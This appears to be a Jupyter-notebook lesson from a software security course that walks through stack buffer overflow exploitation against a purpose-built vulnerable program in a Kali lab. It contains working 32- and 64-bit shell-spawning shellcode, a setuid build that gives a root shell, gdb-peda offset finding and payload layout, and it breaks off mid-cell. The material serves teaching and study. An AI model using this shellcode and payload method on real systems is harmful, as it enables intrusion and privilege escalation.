## Stack Overflow - Remote Code Execution

- instead of sending junk and executing the existing code, send your own code and execute it!
- for this technique to succeed, program's stack must be executable (not just read and write)
- let's define some terminologies

### Payload
- a buffer that contains code and data to exploit the vulnerability
- payload typically has the following structure:

```bash
| repeated nop sled | shellcode | repeated controlled return address |
```
- offset determines the length of the payload
- shellcode size is fixed depending on what the code is supposed to do
- usually room to play with the length of nop sled and controlled return address

### nop sled
- `\x90` - no operation instruction in assembly
- if the buffer is large enough, use good number of NOP as a bigger cushion/wider landing zone
- as the stack may shift a bit, it's harder to land exactly where the shellcode is
- NOP let's you slide right to your shellcode that spawns a shell/terminal
- you still need to pad the controlled buffer to make it long enough to overwrite the caller's return address
    
### shellcode
- shellcode is attacker's code that can do anything 
    - such as creating/deleting a log file, adding a new user, change filewall rule, etc.
- binary code that actually exploits the vulnerability
- most common shellcode typically spawns, local or remote, tcp connect, reverse connect shell/terminal
- let's you own the system by giving you access to the terminal
- Shellcodes database - [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
  
### repeated return address
- address pointing to some address of repeated nop sled  where it is stored in buffer variable
- this controlled return address should overwrite the caller's return address on stack


### Example program that spawns shell/terminal
- let's look at an example program that spawns shell/terminal on the system by calling system call
- `shellcode/system_shell.cpp` program uses system function defined in `<stdlib.h>` library to exectue `/bin/sh` command


```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/notebooks



```python
%cd ../demos/shellcodes
```

    /home/kali/projects/SoftwareSecurity/demos/shellcodes



```python
! cat system_shell.cpp
```

    #include <unistd.h>
    
    int main() {
        char * name[2];
        name[0] = "/bin/sh";
        name[1] = NULL;
        execve(name[0], name, NULL);
        return 0;
    }


```python
! g++ -o shellcode.exe system_shell.cpp
```

    [01m[Ksystem_shell.cpp:[m[K In function ‘[01m[Kint[01;32m[K main[m[K()[m[K’:
    [01m[Ksystem_shell.cpp:5:15:[m[K [01;35m[Kwarning: [m[KISO C++ forbids converting a string constant to ‘[01m[Kchar*[m[K’ [[01;35m[K]8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wwrite-strings-Wwrite-strings]8;;[m[K]
        5 |     name[0] = [01;35m[K"/bin/sh"[m[K;
          |               [01;35m[K^~~~~~~~~[m[K


- run system_shell.exe from terminal
    - Jupyter notebook doesn't give shell/terminal

```
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/shellcodes]
└─$ ./shellcode.exe        
$ whoami
kali
$ date
Mon Mar 31 16:51:04 EDT 2025
$ exit
```
    
- note that shellcode:
    - typically is NOT bash command string by itself - /bin/sh
    - is executable binary when executed gives shell/terminal
    - typically written in C/assembly and compiled/assembled as a binary
    - if stored in stack as a part of buffer, stack must be Executable!
        - so the buffer can be treated as executable code
    - can't just compile C code and create exploit code (lot more complicated)
        
        
## Remote code execution demos

- make stack executable
- send the remote shellcode as an input (stdin, filein, argv, etc.) to the program
- find the location of the shellcode and execute it

### Use program argument to smuggle shellcode

- if the vulnerable program uses argument to get the data, provide shellcode instead of data!
- let's demonstrate it with `demos/stack_overflow/so_arg.cpp` program

### 32-bit Shellcode
- https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Buffer_Overflow_Setuid.pdf
- the following assembly essentially does the same as the C++ code above

```c++
; Store the command on stack
xor eax, eax
push eax
push "//sh"                      ; // makes sh 32-bit word instead of /sh with is 24-bit
push "/bin"
mov ebx, esp                     ; ebx --> "/bin//sh": execve()’s 1st argument

; Construct the argument array argv[]
push eax                         ; argv[1] = 0
push ebx                         ; argv[0] --> "/bin//sh"
mov ecx, esp                     ; ecx --> argv[]: execve()’s 2nd argument

; For environment variable
xor edx, edx                     ; edx = 0: execve()’s 3rd argument

; Invoke execve()
xor eax, eax
mov al, 0x0b                    ; execve()’s system call number
int 0x80                        ; interrupt to make system call
```

### 64-bit Shellcode

```cpp
xor rdx, rdx          ; rdx = 0: execve()’s 3rd argument
push rdx
mov rax, ’/bin//sh’   ; the command we want to run
push rax ;
mov rdi, rsp          ; rdi --> "/bin//sh": execve()’s 1st argument
push rdx              ; argv[1] = 0
push rdi              ; argv[0] --> "/bin//sh"
mov rsi, rsp          ; rsi --> argv[]: execve()’s 2nd argument
xor rax, rax
mov al, 0x3b          ; execve()’s system call number
syscall
```

### Shellcode in action

- we can create the binary version of shellcode above and use it in our exploit code
- exploit code can be written in any language such as, C/C++, Bash, Python, etc.
- as a quick demo, let's see `call_shellcode.cpp` file in `shellcode` folder to demo launching the binary shellcode
- use Makefile provided to build 32-bit and 64-bit executable and observe the exploit-code behavior when executing them
- compile without setuid and with setuid and observe the difference
- for setuid to be effective make sure to create a softlink /bin/sh pointing to /bin/zsh
- run the binary shellcodes from the Terminal
```bash
sudo ln -sf /bin/zsh /bin/sh
```


```python
! echo kali | sudo -S ln -sf /bin/zsh /bin/sh
```

    [sudo] password for kali: 


```python
! cat call_shellcode.cpp
```

    #include <cstdlib>
    #include <cstring>
    
    
    const char shellcode[] =
    #ifdef __x86_64__
        "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
        "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
        "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
    #else
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
        "\xd2\x31\xc0\xb0\x0b\xcd\x80"
    #endif
    ;
    
    int main(int argc, char **argv)
    {
        char code[500];
        strcpy(code, shellcode); // Copy the shellcode to the stack
        int (*func)() = (int(*)())code;
        func(); // Invoke the shellcode from the stack
        return 0;
    }


```python
! cat Makefile
```

    
    .PHONY: all
    all: 32bit 64bit
    
    .PHONY: clean
    clean:
    	rm -f *.out
    
    .PHONY: 32bit
    32bit:
    	g++ -m32 -z execstack -o callshell32.out call_shellcode.cpp
    	@echo callshell32.out built successfully!
    
    .PHONY: 64bit
    64bit:
    	g++ -z execstack -o callshell64.out call_shellcode.cpp
    	@echo callshell64.out built successfully!
    
    .PHONY: setuid
    setuid: all
    	sudo chown root:root callshell32.out callshell64.out
    	sudo chmod u+s callshell32.out callshell64.out
    	@echo setuid set for both 32-bit and 64-bit exectuables!



```python
! echo kali | sudo -S make setuid
```

    [sudo] password for kali: g++ -m32 -z execstack -o callshell32.out call_shellcode.cpp
    callshell32.out built successfully!
    g++ -z execstack -o callshell64.out call_shellcode.cpp
    callshell64.out built successfully!
    sudo chown root:root callshell32.out callshell64.out
    sudo chmod u+s callshell32.out callshell64.out
    setuid set for both 32-bit and 64-bit exectuables!


- run the output executable shellcodes

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/shellcodes]
└─$ ./callshell32.out
# whoami                                                                                                      
root
# ls                                                                                                          
Makefile            callshell32.out  shellcode.bin  shellcode_root.bin   system_shell.cpp   x86-linux-sh.py
call_shellcode.cpp  callshell64.out  shellcode.exe  shellcode_writer.py  system_shell1.cpp
# date                                                                                                        
Mon Mar 31 16:58:41 EDT 2025
# exit 


┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/shellcodes]
└─$ ./callshell64.out 
# whoami                                                                                                      
root
# exit   
```

## Exploiting stack overflow via argument to main

- this has been demonstrated before using pwntools


```python
!pwd
```

    /home/kali/projects/SoftwareSecurity/demos/shellcodes



```python
%cd ../stack_overflow
```

    /home/kali/projects/SoftwareSecurity/demos/stack_overflow



```python
# let's look at the source
# program simply copies and prints the user provided argument
! cat so_arg.cpp
```

    #include <cstdio>
    #include <cstring>
    #include <iostream>
    
    using namespace std;
    
    #define BUFSIZE 128
    
    void copydata(char *dst_buf, char *src_buf) {
        // similar to strcpy in cstdio
        size_t i = 0;
        // copy each character from src_buf to des_buffer
        // stop when NUL character is encountered
        while (*(src_buf+i) != 0) {
            *(dst_buf+i) = *(src_buf+i);
            i++;
        }
        *(dst_buf+i) = 0; // end with NUL character
    }
    
    void bad(char *data) {
        char buffer[BUFSIZE];
        printf("buffer is at %p\n", buffer);
        //strcpy(buffer, data);
        copydata(buffer, data);
        cout << "buffer contains: \n" << buffer << endl;
    }
    
    int main(int argc, char *argv[]) {
        bad(argv[1]);
        cout << "Good bye!" << endl;
        return 0;
    }


```bash
%%bash
# let's compile and execute the program
input="so_arg.cpp"
output=so_arg.exe
echo kali | sudo -S ../compile.sh $input $output
```

    [sudo] password for kali: so_arg.cpp: In function ‘int main(int, char**)’:
    so_arg.cpp:29:14: warning: unused parameter ‘argc’ [-Wunused-parameter]
       29 | int main(int argc, char *argv[]) {
          |          ~~~~^~~~


### crash the program
- provide a large string and see how the program behaves
- if the program crashes, availability of the program is violated and is the telltale sign that the program is likeley vulnerabile to stackoverflow!


```python
! ./so_arg.exe $(python3 -c 'print("A"*100)')
# note the buffer address!
# How do you know the program has crashed? 
# On terminal you'll see segfault!
# On Jupyter notebook it's not obvious...
```

    buffer is at 0xffffbc20
    buffer contains: 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Good bye!



```python
# provide a longer argument and see if the program segfaults
! ./so_arg.exe $(python3 -c 'print("A"*128)')
# also note the buffer address
```

    buffer is at 0xffffbc00
    buffer contains: 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Good bye!



```python
# provide a longer argument and see if the program segfaults
! ./so_arg.exe $(python3 -c 'print("A"*200)')
# buffer size is 128; 124 A's crashes the program; notice no Good bye! printed
# also note the buffer address
```

    buffer is at 0xffffbbc0
    buffer contains: 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


- let's verify it on from the terminal that the program actually crashed

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./so_arg.exe $(python3 -c 'print("A"*140)')                                              
buffer is at 0xffffb8e0
buffer contains: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./so_arg.exe $(python3 -c 'print("A"*140)')

```

### Remote code execution steps

1. find the offset to return address using gdb-peda
2. generate shellcode using tools (peda, pwntools) or find the right shellcode at [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
3. find the return address of buffer or nop sled
4. create payload and send it to the target program appropriately

### Use gdb-peda to find offset to EIP and address of buffer

- address of buffer is already printed - careful with the shifting address
- use the same fixed length JUNK/pattern to keep the address consistently the same while crashing the
- use gdb batch command file or manually step by stem command

#### Use gdb-peda manually

- find the offset using gdb-peda
- we'll find the offset that overwrites the caller's return address

```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ gdb -q so_arg.exe      
Reading symbols from so_arg.exe...
```

- create cyclic pattern (long enough) 200 bytes as an argument and use it to run the program

```bash
gdb-peda$ pattern arg 200
Set 1 arguments to program

gdb-peda$ run

Starting program: /home/kali/EthicalHacking/so_arg.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
buffer is at 0xffffc250
buffer contains: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xf7fb2c00 --> 0xf7faf990 --> 0xf7ef71b0 (<_ZNSoD1Ev>:     push   ebx)
EBX: 0x6c414150 ('PAAl')
ECX: 0x6c0 
EDX: 0x8051bb0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
ESI: 0xf7de6000 --> 0x1e4d6c 
EDI: 0xf7de6000 --> 0x1e4d6c 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffc2e0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffc2e0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffc2e4 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffc2e8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffc2ec ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffc2f0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffc2f4 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffc2f8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffc2fc ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
```

```bash

gdb-peda$ patts
Registers contain pattern buffer:
EBX+0 found at offset: 132
EBP+0 found at offset: 136
EIP+0 found at offset: 140 <---- !!!THIS IS THE OFFSET!!!
Registers point to pattern buffer:
[EDX] --> offset 0 - size ~203
[ESP] --> offset 144 - size ~56 
Pattern buffer found at:
0x08051bb0 : offset    0 - size  200 ([heap])
0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)
0xffffc250 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])
0xffffc625 : offset    0 - size  200 ($sp + 0x345 [209 dwords])
References to pattern buffer found at:
0xf7de6d24 : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d28 : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d2c : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d30 : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d34 : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d38 : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xf7de6d3c : 0x08051bb0 (/usr/lib32/libc-2.31.so)
0xffffbbc4 : 0x08051bb0 ($sp + -0x71c [-455 dwords])
0xffffbbe8 : 0x08051bb0 ($sp + -0x6f8 [-446 dwords])
0xffffbc14 : 0x08051bb0 ($sp + -0x6cc [-435 dwords])
0xffffbc30 : 0x08051bb0 ($sp + -0x6b0 [-428 dwords])
0xffffbc34 : 0x08051bb0 ($sp + -0x6ac [-427 dwords])
0xffffbc44 : 0x08051bb0 ($sp + -0x69c [-423 dwords])
0xffffbc94 : 0x08051bb0 ($sp + -0x64c [-403 dwords])
0xffffc0d8 : 0x08051bb0 ($sp + -0x208 [-130 dwords])
0xffffc124 : 0x08051bb0 ($sp + -0x1bc [-111 dwords])
0xf7e62dcc : 0xffffc250 (/usr/lib32/libstdc++.so.6.0.28)
0xffffbd40 : 0xffffc250 ($sp + -0x5a0 [-360 dwords])
0xf7e650b7 : 0xffffc625 (/usr/lib32/libstdc++.so.6.0.28)
0xffffc3b8 : 0xffffc625 ($sp + 0xd8 [54 dwords])

```

- buffer address is conviniently printed everytime program is executed

```bash

┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ ./so_arg.exe $(python3 -c 'print("A"*10)')                                                                 139 ⨯
buffer is at 0xffffc360   <--------- buffer address; will this shift as the argument length changes?
buffer contains: 
AAAAAAAAAA
Good bye!
```

#### Use batch commands
- gdb allows batch file to automte a series of commands to be executed
- see `demos/stack_overflow/gdb-so-arg.txt` as a demo
- use batch command file with gdb-peda using the following command:

```bash
gdb -q -batch -x <gdb-batch-commands.txt> ./<target_program>
```


```python
! cat gdb-so-arg.txt
```

    break main
    pattern arg 200
    run
    continue
    patts
    quit



```python
! gdb -q -batch -x gdb-so-arg.txt ./so_arg.exe
```

    Breakpoint 1 at 0x8049279: file so_arg.cpp, line 30.
    [mSet 1 arguments to program[0m
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
    Use 'set logging enabled off'.
    
    Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
    Use 'set logging enabled on'.
    
    [2J[H[;34m[----------------------------------registers-----------------------------------][0m
    [m[;32mEAX[0m: [;34m0xffffbbf0[0m --> 0x2 
    [;32mEBX[0m: [;32m0x804bff4[0m --> [;32m0x804bef8[0m --> 0x1 
    [;32mECX[0m: [;34m0xffffbbf0[0m --> 0x2 
    [;32mEDX[0m: [;34m0xffffbc10[0m --> [;32m0xf7a35e14[0m --> 0x235d0c ('\x0c]#')
    [;32mESI[0m: [;34m0xffffbcb0[0m --> [;34m0xffffc081[0m ("COLORFGBG=15;0")
    [;32mEDI[0m: [;32m0xf7ffcb60[0m --> 0x0 
    [;32mEBP[0m: [;34m0xffffbbd8[0m --> 0x0 
    [;32mESP[0m: [;34m0xffffbbd0[0m --> [;34m0xffffbbf0[0m --> 0x2 
    [;32mEIP[0m: [;31m0x8049279[0m (<main(int, char**)+28>:	mov    eax,DWORD PTR [eax+0x4])[0m
    [m[;32mEFLAGS[0m: 0x202 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
    [m[;34m[-------------------------------------code-------------------------------------][0m[0m
    [m   0x804926c <main(int, char**)+15>:[;2;32m	call   0x80490c0 <__x86.get_pc_thunk.bx>[0m
       0x8049271 <main(int, char**)+20>:[;2m	add    ebx,0x2d83[0m
       0x8049277 <main(int, char**)+26>:[;2m	mov    eax,ecx[0m
    => 0x8049279 <main(int, char**)+28>:[;1;32m	mov    eax,DWORD PTR [eax+0x4][0m
       0x804927c <main(int, char**)+31>:[m	add    eax,0x4[0m
       0x804927f <main(int, char**)+34>:[m	mov    eax,DWORD PTR [eax][0m
       0x8049281 <main(int, char**)+36>:[m	sub    esp,0xc[0m
       0x8049284 <main(int, char**)+39>:[m	push   eax[0m[0m
    [m[;34m[------------------------------------stack-------------------------------------][0m[0m
    [m0000| [;34m0xffffbbd0[0m --> [;34m0xffffbbf0[0m --> 0x2 [0m
    [m0004| [;34m0xffffbbd4[0m --> [;32m0xf7a35e14[0m --> 0x235d0c ('\x0c]#')[0m
    [m0008| [;34m0xffffbbd8[0m --> 0x0 [0m
    [m0012| [;34m0xffffbbdc[0m --> [;31m0xf7824d43[0m (add    esp,0x10)[0m
    [m0016| [;34m0xffffbbe0[0m --> 0x0 [0m
    [m0020| [;34m0xffffbbe4[0m --> 0x0 [0m
    [m0024| [;34m0xffffbbe8[0m --> [;31m0xf783e069[0m (add    ebx,0x1f7dab)[0m
    [m0028| [;34m0xffffbbec[0m --> [;31m0xf7824d43[0m (add    esp,0x10)[0m
    [;34m[------------------------------------------------------------------------------][0m
    [mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
    
    Breakpoint 1, main (argc=0x2, argv=0xffffbca4) at so_arg.cpp:30
    30	    bad(argv[1]);
    buffer is at 0xffffbb30
    buffer contains: 
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
    
    Program received signal SIGSEGV, Segmentation fault.
    [2J[H[;34m[----------------------------------registers-----------------------------------][0m
    [m[;32mEAX[0m: [;34m0xf7e6ac40[0m --> [;32m0xf7e6792c[0m --> [;31m0xf7d2a330[0m (<_ZNSoD1Ev>:	endbr32)
    [;32mEBX[0m: 0x6c414150 ('PAAl')
    [;32mECX[0m: 0x0 
    [;32mEDX[0m: [;32m0xf7e6792c[0m --> [;31m0xf7d2a330[0m (<_ZNSoD1Ev>:	endbr32)
    [;32mESI[0m: [;34m0xffffbcb0[0m --> [;34m0xffffc081[0m ("COLORFGBG=15;0")
    [;32mEDI[0m: [;32m0xf7ffcb60[0m --> 0x0 
    [;32mEBP[0m: 0x41514141 ('AAQA')
    [;32mESP[0m: [;34m0xffffbbc0[0m ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    [;32mEIP[0m: 0x41416d41 ('AmAA')[0m
    [m[;32mEFLAGS[0m: 0x10286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
    [m[;34m[-------------------------------------code-------------------------------------][0m[0m
    [;31mInvalid $PC address: 0x41416d41[0m
    [m[;34m[------------------------------------stack-------------------------------------][0m[0m
    [m0000| [;34m0xffffbbc0[0m ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0004| [;34m0xffffbbc4[0m ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0008| [;34m0xffffbbc8[0m ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0012| [;34m0xffffbbcc[0m ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0016| [;34m0xffffbbd0[0m ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0020| [;34m0xffffbbd4[0m ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0024| [;34m0xffffbbd8[0m ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0028| [;34m0xffffbbdc[0m ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [;34m[------------------------------------------------------------------------------][0m
    [mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
    [mStopped reason: [;31mSIGSEGV[0m[0m
    0x41416d41 in ?? ()
    [;31mRegisters contain pattern buffer:[0m
    [mEBX+0 found at offset: 132[0m
    [mEBP+0 found at offset: 136[0m
    [mEIP+0 found at offset: 140[0m
    [;33mRegisters point to pattern buffer:[0m
    [m[ESP] --> offset 144 - size ~56[0m
    [;32mPattern buffer found at:[0m
    [m0x080503b0 : offset    0 - size  200 ([heap])[0m
    [m0xf7fa606d : offset 33208 - size    4 (/usr/lib32/libm.so.6)[0m
    [m0xffffbb30 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])[0m
    [m0xffffbfb8 : offset    0 - size  200 ($sp + 0x3f8 [254 dwords])[0m
    [m0xffffd9a8 : offset 31453 - size    4 ($sp + 0x1de8 [1914 dwords])[0m
    [;34mReferences to pattern buffer found at:[0m
    [m0xf7a36d44 : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d48 : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d4c : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d50 : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d54 : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d58 : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xf7a36d5c : 0x080503b0 (/usr/lib32/libc.so.6)[0m
    [m0xffffb868 : 0x080503b0 ($sp + -0x358 [-214 dwords])[0m
    [m0xffffb55c : 0xffffbb30 ($sp + -0x664 [-409 dwords])[0m
    [m0xffffbca8 : 0xffffbfb8 ($sp + 0xe8 [58 dwords])[0m


### need shellcode

- next we need a **shellcode**
- a couple of binary shellcode files are already provided in `shellcode` folder
- `shellcode.bin` and `shellcode_root.bin`


```python
! ls -l ../shellcodes
```

    total 88
    -rwsr-xr-x 1 root root 14992 Apr  2 15:22 callshell32.out
    -rwsr-xr-x 1 root root 15880 Apr  2 15:22 callshell64.out
    -rw-r--r-- 1 kali kali   589 Mar 31 14:20 call_shellcode.cpp
    -rw-r--r-- 1 kali kali   500 Mar 31 14:20 Makefile
    -rw-r--r-- 1 kali kali   124 Mar 31 17:14 payload.bin
    -rw-r--r-- 1 kali kali    24 Mar 31 14:20 shellcode.bin
    -rwxr-xr-x 1 kali kali 15960 Apr  2 15:12 shellcode.exe
    -rw-r--r-- 1 kali kali    24 Mar 31 17:14 shellcode_py3.bin
    -rw-r--r-- 1 kali kali    35 Mar 31 14:20 shellcode_root.bin
    -rw-r--r-- 1 kali kali   978 Mar 31 14:20 shellcode_writer.py
    -rw-r--r-- 1 kali kali   153 Mar 31 14:20 system_shell1.cpp
    -rw-r--r-- 1 kali kali   147 Mar 31 14:20 system_shell.cpp
    -rw-r--r-- 1 kali kali   364 Mar 31 14:20 x86-linux-sh.py


### generate shellcode with GDB-PEDA

- PEDA provides several shellcodes to pick from
- the following command generates linux/x86 local shellcode


```bash
┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]
└─$ gdb -q
gdb-peda$ shellcode generate
Available shellcodes:
    x86/linux exec
    x86/linux bindport
    x86/linux connect
    x86/bsd exec
    x86/bsd bindport
    x86/bsd connect

gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

```

- you can write the generated shellcode to a binary file for easy access
- copy line by line hex values between " " and append it to a binary file
- you can bash echo, or python3's `sys.stdout.buffer.write()`
- the following code demonstrates writing shellcode to a file using echo Bash 
command


```python
# -n : do not print the trailing newline
# -e : enable intrepretation of blackslash
! echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68" > shellcode_bash.bin
! echo -ne "\x68\x2f\x62\x69\x6e\x89\xe3\x31" >> shellcode_bash.bin
! echo -ne "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" >> shellcode_bash.bin
```


```python
! wc -c shellcode_bash.bin
```

    24 shellcode_bash.bin



```python
! hexdump -C shellcode_bash.bin
```

- the following Pyton3 script to write the shellcode to a binary file


```python
# Python3 script
# make sure to convert into byte string
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)
with open('shellcode_py3.bin', 'wb') as fout:
    #fout.write(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31")
    #fout.write(b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80")
    fout.write(shellcode)
```


```python
! wc -c shellcode_py3.bin
```

    24 shellcode_py3.bin



```python
! hexdump -C shellcode_py3.bin
```

    00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|
    00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|
    00000018


### create payload

- recall payload has the following structure
```
| NOP sled | shellcode | controlled return address |
```

- we found out that **144** is the total length of the payload as **140** is the offset
- user shellcode (see above) is **24** bytes long
- total bytes remaining for NOP sled and repeated return address can be calculated as following


```python
print(144-24)
```

    120


- 144-20 (size of shellcode) = 120
- out of **120** bytes, return address size is 4 in 32-bit system
- let's repeat the return address *5 times*
- so the size of repeated return address = **5\*4 = 20**
- that leaves us with **120 - 20 = 100 NOP sled**
- **make sure length of (NOP sled + Shellcode) is a multiple of 4!**
    - so the one of the 4-byte repeated return addresses perfectly aligns at the (EBP+4) location

- so, we'll create the payload file (144 bytes long) with the following structure

```txt
| 100 NOP sled | 24 bytes shellcode | 5 controlled-return-addresses (5*4=20 bytes) |
```


```python
